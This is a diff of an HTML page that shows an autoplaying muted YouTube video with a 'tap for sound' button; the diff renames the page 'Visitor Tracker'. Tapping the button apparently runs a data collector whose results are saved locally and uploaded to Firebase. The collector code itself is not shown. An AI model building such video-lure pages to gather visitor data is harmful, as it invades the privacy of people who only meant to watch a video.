@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>YouTube Video Viewer</title>
+    <title>Visitor Tracker</title>
     <style>
         body {
             margin: 0;
@@ -16,6 +16,7 @@
             background-color: #f0f0f0;
             touch-action: manipulation;
             overflow: hidden;
+            font-family: Arial, sans-serif;
         }
         .video-container {
             width: 95%;
@@ -27,6 +28,7 @@
             height: auto;
             aspect-ratio: 16/9;
             border: none;
+            border-radius: 10px;
         }
         #unmute-btn {
             margin-top: 15px;
@@ -40,23 +42,6 @@
             cursor: pointer;
             box-shadow: 0 4px 8px rgba(0,0,0,0.2);
             transition: all 0.3s ease;
-            position: relative;
-            overflow: hidden;
-        }
-        #unmute-btn::after {
-            content: "";
-            position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: rgba(255,255,255,0.2);
-            transform: rotate(30deg);
-            animation: shine 3s infinite;
-        }
-        @keyframes shine {
-            0% { transform: rotate(30deg) translate(-30%, -30%); }
-            100% { transform: rotate(30deg) translate(30%, 30%); }
         }
         #unmute-btn:hover {
             transform: scale(1.05);
@@ -74,10 +59,25 @@
             margin-top: 10px;
             color: #666;
             font-size: 14px;
+            text-align: center;
+        }
+        .firebase-test {
+            position: fixed;
+            top: 10px;
+            right: 10px;
+            background: #007bff;
+            color: white;
+            border: none;
+            padding: 5px 10px;
+            border-radius: 5px;
+            cursor: pointer;
+            z-index: 1000;
         }
     </style>
 </head>
 <body>
+    <button class="firebase-test" onclick="testFirebase()">Test Firebase</button>
+
     <div class="video-container">
         <iframe id="yt-video" 
                 src="https://www.youtube.com/embed/YnDtpILctso?autoplay=1&mute=1&enablejsapi=1&playsinline=1" 
@@ -89,15 +89,11 @@
     <button id="unmute-btn" class="pulse">TAP HERE FOR SOUND 🔊</button>
     <div id="status">Loading...</div>
 
+    <!-- Firebase SDK -->
+    <script type="module" src="scripts/firebase.js"></script>
     <script src="scripts/main.js"></script>
+    
     <script>
-        <!-- Add Firebase SDK -->
-<script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
-<script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-firestore-compat.js"></script>
-
-<script src="scripts/firestore.js"></script>
-<script src="scripts/storage.js"></script>
-<script src="scripts/main.js"></script>
         // Disable zooming on mobile
         document.addEventListener('gesturestart', function(e) {
             e.preventDefault();
@@ -160,16 +156,33 @@
                 const result = await DataCollector.collectAllData();
                 
                 if (result.success) {
-                    document.getElementById('status').textContent = 'Data collected successfully!';
-                    console.log('Data captured:', result.data);
+                    document.getElementById('status').innerHTML = 
+                        '✅ Data collected successfully!<br>' +
+                        'Local: ' + (result.storage.local.success ? '✅' : '❌') + ' | ' +
+                        'Cloud: ' + (result.storage.firestore.success ? '✅' : '❌');
+                    
+                    console.log('Data captured:', result);
                 } else {
-                    document.getElementById('status').textContent = 'Data collection completed with some limitations';
+                    document.getElementById('status').textContent = 'Data collection failed';
                 }
             } catch (error) {
                 console.error('Error capturing data:', error);
-                document.getElementById('status').textContent = 'Data collection error';
+                document.getElementById('status').textContent = 'Error: ' + error.message;
             }
         }
+
+        // Test Firebase connection
+        async function testFirebase() {
+            const result = await FirestoreStorage.testConnection();
+            alert(result.success ? 
+                '✅ Firebase Connected!\nDoc ID: ' + result.docId : 
+                '❌ Error: ' + result.error);
+        }
+
+        // Auto-collect data on page load
+        window.addEventListener('load', function() {
+            console.log('Visitor Tracker loaded');
+        });
     </script>
 </body>
 </html>
